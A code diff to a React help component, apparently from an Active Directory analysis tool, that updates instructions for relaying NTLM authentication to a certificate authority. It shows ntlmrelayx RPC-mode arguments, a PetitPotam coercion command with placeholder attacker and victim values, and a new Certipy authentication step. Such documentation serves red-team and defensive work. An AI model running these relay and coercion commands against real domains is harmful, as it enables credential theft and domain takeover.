@@ -30,10 +30,12 @@ const LinuxAbuse: FC = () => {
                     href='https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'>
                     ntlmrelayx.py
                 </Link>
-                . To relay to the enterprise CA and enroll a certificate, specify the HTTP(S) endpoint as the target and
-                use the arguments:
+                . To relay to the enterprise CA via RPC endpoints and enroll a certificate, specify the RPC endpoint as
+                the target and use the arguments:
             </Typography>
-            <Typography component={'pre'}>{'--adcs --template <TEMPLATE_NAME>'}</Typography>
+            <Typography component={'pre'}>
+                {'-t rpc://<CA_IP> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support'}
+            </Typography>
 
             <Typography variant='body1'>2. Coerce the Target Computer</Typography>
             <Typography variant='body2'>
@@ -72,6 +74,15 @@ const LinuxAbuse: FC = () => {
             </Typography>
             <Typography component={'pre'}>
                 {'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'}
+            </Typography>
+
+            <Typography variant='body1'>3. Perform Certificate Authentication</Typography>
+            <Typography variant='body2'>
+                Authenticate using the certificate obtained as the target principal, for example by using{' '}
+                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/ly4k/Certipy'>
+                    Certipy
+                </Link>
+                .
             </Typography>
         </>
     );
